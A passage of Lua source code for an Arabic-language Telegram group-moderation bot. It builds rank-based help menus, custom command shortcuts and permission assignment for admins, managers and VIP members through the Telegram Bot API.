᥀︙حظر • الغاء حظر
᥀︙المكتومين • حذف المكتومين
᥀︙المقيدين • حذف المقيدين
᥀︙المحظورين • حذف المحظورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تقييد دقيقه + عدد الدقائق
᥀︙تقييد ساعه + عدد الساعات
᥀︙تقييد يوم + عدد الايام
᥀︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList3:(.*)') then
local Joker = DataText:match('/HelpList3:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevJoker:get(BlAcK..'Joker:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
᥀︙ضع اسم + الاسم
᥀︙اضف • حذف ↫ رد
᥀︙ردود المدير
᥀︙حذف ردود المدير
᥀︙اضف • حذف ↫ رد متعدد
᥀︙حذف رد من متعدد
᥀︙الردود المتعدده
᥀︙حذف الردود المتعدده
᥀︙حذف قوائم المنع
᥀︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
᥀︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙رفع ادمن • تنزيل ادمن
᥀︙الادمنيه • حذف الادمنيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تثبيت
᥀︙الغاء التثبيت
᥀︙اعاده التثبيت
᥀︙الغاء تثبيت الكل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغير رد + اسم الرتبه + النص ↫ ⤈
᥀︙المطور • منشئ الاساسي
᥀︙المنشئ • المدير • الادمن
᥀︙المميز • المنظف • العضو
᥀︙حذف ردود الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغيير الايدي ↫ لتغيير الكليشه
᥀︙تعيين الايدي ↫ لتعيين الكليشه
᥀︙حذف الايدي ↫ لحذف الكليشه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙اطردني • الايدي بالصوره • الابراج
᥀︙معاني الاسماء • اوامر النسب • انطق
᥀︙الايدي • تحويل الصيغ • اوامر التحشيش
᥀︙ردود المدير • ردود المطور • التحقق
᥀︙ضافني • حساب العمر • الزخرفه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList4:(.*)') then
local Joker = DataText:match('/HelpList4:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevJoker:get(BlAcK..'Joker:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙الميديا • امسح
᥀︙تعين عدد الحذف
᥀︙ترتيب الاوامر
᥀︙اضف • حذف ↫ امر
᥀︙حذف الاوامر المضافه
᥀︙الاوامر المضافه
᥀︙اضف نقاط ↫ بالرد • بالايدي
᥀︙اضف رسائل ↫ بالرد • بالايدي
᥀︙رفع منظف • تنزيل منظف
᥀︙المنظفين • حذف المنظفين
᥀︙رفع مدير • تنزيل مدير
᥀︙المدراء • حذف المدراء
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙نزلني • امسح
᥀︙الحظر • الكتم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙وضع لقب + اللقب
᥀︙تفعيل • تعطيل ↫ الرفع
᥀︙رفع منشئ • تنزيل منشئ
᥀︙المنشئين • حذف المنشئين
᥀︙رفع • تنزيل ↫ مشرف
᥀︙رفع بكل الصلاحيات
᥀︙حذف القوائم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المالكين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ منشئ اساسي
᥀︙حذف المنشئين الاساسيين 
᥀︙المنشئين الاساسيين 
᥀︙حذف جميع الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_},{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList5:(.*)') then
local Joker = DataText:match('/HelpList5:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
if not Admin(data) then
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا ليس لديك صلاحية التحكم لهذا الامر .")..'&show_alert=true')
end
local Help = DevJoker:get(BlAcK..'Joker:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
᥀︙المطورين
᥀︙المشتركين
᥀︙الاحصائيات
᥀︙المجموعات
᥀︙اسم البوت + غادر
᥀︙اسم البوت + تعطيل
᥀︙كشف + -ايدي المجموعه
᥀︙رفع مالك • تنزيل مالك
᥀︙المالكين • حذف المالكين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ مدير عام
᥀︙حذف • المدراء العامين 
᥀︙رفع • تنزيل ↫ ادمن عام
᥀︙حذف • الادمنيه العامين 
᥀︙رفع • تنزيل ↫ مميز عام
᥀︙حذف • المميزين عام 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المطور الاساسي ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تحديث
᥀︙السيرفر
᥀︙روابط الكروبات
᥀︙تحديث السورس
᥀︙تنظيف الكروبات
᥀︙تنظيف المشتركين
᥀︙حذف جميع الملفات
᥀︙تعيين الايدي العام
᥀︙تغير المطور الاساسي
᥀︙حذف معلومات الترحيب
᥀︙تغير معلومات الترحيب
᥀︙غادر + -ايدي المجموعه
᥀︙تعيين عدد الاعضاء + العدد
᥀︙حظر عام • الغاء العام
᥀︙كتم عام • الغاء العام
᥀︙قائمه العام • حذف قائمه العام
᥀︙وضع • حذف ↫ اسم البوت
᥀︙اضف • حذف ↫ رد عام
᥀︙ردود المطور • حذف ردود المطور
᥀︙تعيين • حذف • جلب ↫ رد الخاص
᥀︙جلب نسخه الكروبات
᥀︙رفع النسخه + بالرد على الملف
᥀︙تعيين • حذف ↫ قناة الاشتراك
᥀︙جلب كليشه الاشتراك
᥀︙تغيير • حذف ↫ كليشه الاشتراك
᥀︙رفع • تنزيل ↫ مطور
᥀︙المطورين • حذف المطورين
᥀︙رفع • تنزيل ↫ مطور ثانوي
᥀︙الثانويين • حذف الثانويين
᥀︙تعيين • حذف ↫ كليشة الايدي
᥀︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل ملف + اسم الملف
᥀︙تعطيل ملف + اسم الملف
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙الاذاعه • الاشتراك الاجباري
᥀︙ترحيب البوت • المغادره
᥀︙البوت الخدمي • التواصل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر الاعضاء",callback_data="/HelpList6:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
if DataText and DataText:match('/HelpList6:(.*)') then
local Joker = DataText:match('/HelpList6:(.*)')
if tonumber(Joker) == tonumber(data.sender_user_id_) then
local Help = DevJoker:get(BlAcK..'Joker:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙السورس • موقعي • رتبتي • معلوماتي 
᥀︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
᥀︙ميمز • متحركه • صوره • ريمكس • فلم • مسلسل • انمي
᥀︙رسائلي • حذف رسائلي • اسمي • معرفي 
᥀︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
᥀︙نقاطي • بيع نقاطي • القوانين • زخرفه 
᥀︙رابط الحذف • نزلني • اطردني • المطور 
᥀︙منو ضافني • مشاهدات المنشور • الرابط 
᥀︙ايدي المجموعه • معلومات المجموعه 
᥀︙نسبه الحب • نسبه الكره • نسبه الغباء 
᥀︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙لقبه + بالرد
᥀︙كول + الكلمه
᥀︙زخرفه + اسمك
᥀︙برج + نوع البرج
᥀︙معنى اسم + الاسم
᥀︙بوسه • بوسها ↫ بالرد
᥀︙احسب + تاريخ ميلادك
᥀︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
᥀︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
᥀︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
᥀︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text="اوامر الادمنيه",callback_data="/HelpList2:"..data.sender_user_id_},{text="اوامر الحمايه",callback_data="/HelpList1:"..data.sender_user_id_}},{{text="اوامر المنشئين",callback_data="/HelpList4:"..data.sender_user_id_},{text="اوامر المدراء",callback_data="/HelpList3:"..data.sender_user_id_}},{{text="اوامر المطورين",callback_data="/HelpList5:"..data.sender_user_id_}},{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_}},{{text="• رجوع •",callback_data="/HelpList:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Help or Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
return https.request("https://api.telegram.org/bot"..TokenBot..'/answercallbackquery?callback_query_id='..data.id_..'&text='..URL.escape("᥀ عذرا الامر ليس لك .")..'&show_alert=true')
end
end
end
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
text = msg.content_.text_ 
if text and DevJoker:get(BlAcK.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevJoker:get(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevJoker:del(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevJoker:del(BlAcK.."Set:Cmd:Group:New"..msg.chat_id_)
DevJoker:srem(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الامر من المجموعه", 1, 'html')  
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لايوجد امر بهذا الاسم", 1, 'html')
end
DevJoker:del(BlAcK.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevJoker:get(BlAcK..'Joker:NameBot') or "بلاك")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevJoker:get(BlAcK..'Joker:NameBot') or "بلاك")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevJoker:get(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevJoker:get(BlAcK.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevJoker:set(BlAcK.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الجديد", 1, 'html')
DevJoker:del(BlAcK.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevJoker:set(BlAcK.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevJoker:get(BlAcK.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevJoker:get(BlAcK.."Set:Cmd:Group:New"..msg.chat_id_)
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الامر", 1, 'html')
DevJoker:del(BlAcK.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevJoker:smembers(BlAcK.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "᥀︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevJoker:get(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
end
end
if #List == 0 then
t = "᥀︙لاتوجد اوامر مضافه في المجموعه"
end
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if text == "حذف الاوامر المضافه" and ChCheck(msg) or text == "حذف الاوامر" and ChCheck(msg) or text == "مسح الاوامر المضافه" and ChCheck(msg) then
local List = DevJoker:smembers(BlAcK.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevJoker:del(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevJoker:del(BlAcK.."List:Cmd:Group:New"..msg.chat_id_)
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الاوامر المضافه في المجموعه", 1, 'html')
end
if text == "ترتيب الاوامر" and Constructor(msg) and ChCheck(msg) then
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevJoker:set(BlAcK.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevJoker:sadd(BlAcK.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"᥀︙تم ترتيب الاوامر بالشكل التالي ~\n᥀︙ ايدي - ا .\n᥀︙ رفع مميز - م .\n᥀︙رفع ادمن - اد .\n᥀︙ رفع مدير - مد . \n᥀︙ رفع منشى - من . \n᥀︙ رفع منشئ الاساسي - اس  .\n᥀︙ رفع مطور - مط .\n᥀︙رفع مطور ثانوي - ثانوي .\n᥀︙ تنزيل الكل - تك .\n᥀︙ تعطيل الايدي بالصوره - تعط .\n᥀︙ تفعيل الايدي بالصوره - تفع .\n᥀︙ الرابط - ر .\n᥀︙ ردود المدير - رر .\n᥀︙ مسح المكتومين - ،، .\n᥀︙ اضف رد - رد .\n᥀︙ مسح سحكاتي - سح .\n᥀︙ مسح رسائلي - رس .\n᥀︙ غنيلي - غ .\n᥀︙مسح قائمه العام - #")  
end
if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevJoker:set(BlAcK.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر القديم", 1, 'html')
return false
end
if text == "حذف امر" and ChCheck(msg) or text == "مسح امر" and ChCheck(msg) then 
DevJoker:set(BlAcK.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل الامر الذي قمت باضافته يدويا", 1, 'html')
return false
end
end
--     Source BlAcK     --
if text == "الصلاحيات" and ChCheck(msg) or text == "صلاحيات" and ChCheck(msg) then 
local List = DevJoker:smembers(BlAcK.."Coomds"..msg.chat_id_)
if #List == 0 then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد صلاحيات مضافه", 1, 'html')
return false
end
t = "᥀︙قائمة الصلاحيات المضافه ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
var = DevJoker:get(BlAcK.."Comd:New:rt:Joker:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
end
end
Dev_Joker(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if Admin(msg) then
if text == "حذف الصلاحيات" and ChCheck(msg) or text == "مسح الصلاحيات" and ChCheck(msg) then
local List = DevJoker:smembers(BlAcK.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevJoker:del(BlAcK.."Comd:New:rt:Joker:"..v..msg.chat_id_)
DevJoker:del(BlAcK.."Coomds"..msg.chat_id_)
end
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيات المضافه", 1, 'html')
end
end
if text and text:match("^اضف صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^اضف صلاحيه (.*)$")
DevJoker:set(BlAcK.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevJoker:sadd(BlAcK.."Coomds"..msg.chat_id_,ComdNew)  
DevJoker:setex(BlAcK.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n᥀︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevJoker:del(BlAcK.."Comd:New:rt:Joker:"..ComdNew..msg.chat_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف الصلاحيه", 1, 'html')
end
if DevJoker:get(BlAcK.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ᥀$") then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, 'html')
DevJoker:del(BlAcK.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
if not Constructor(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تستطيع اضافة صلاحية ( عضو • مميز  • ادمن )\n᥀︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "ادمن" then
if not Manager(msg) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تستطيع اضافة صلاحية ( عضو • مميز )\n᥀︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مميز" then
if not Admin(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تستطيع اضافة صلاحية ( عضو )\n᥀︙ارسال نوع الصلاحيه مره اخرى", 1, 'html')
return false
end
end
if text == "مدير" or text == "ادمن" or text == "مميز" or text == "عضو" then
local textn = DevJoker:get(BlAcK.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevJoker:set(BlAcK.."Comd:New:rt:Joker:"..textn..msg.chat_id_,text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم اضافة الصلاحيه", 1, 'html')
DevJoker:del(BlAcK.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
end

if text and text:match("رفع (.*)") and tonumber(msg.reply_to_message_id_) > 0 then 
local DEV_Joker = text:match("رفع (.*)")
if DevJoker:sismember(BlAcK.."Coomds"..msg.chat_id_,DEV_Joker) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrJoker = DevJoker:get(BlAcK.."Comd:New:rt:Joker:"..DEV_Joker..msg.chat_id_)
if mrJoker == "مميز" and VipMem(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
DevJoker:set(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_Joker) 
DevJoker:sadd(BlAcK..'Joker:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrJoker == "ادمن" and Admin(msg) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
DevJoker:set(BlAcK.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_Joker)
DevJoker:sadd(BlAcK..'Joker:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrJoker == "مدير" and Manager(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BLACK_TEAM_4')..')'..' ❩\n᥀︙تم رفعه ❨ '..DEV_Joker..' ❩ بنجاح', 1, 'md')
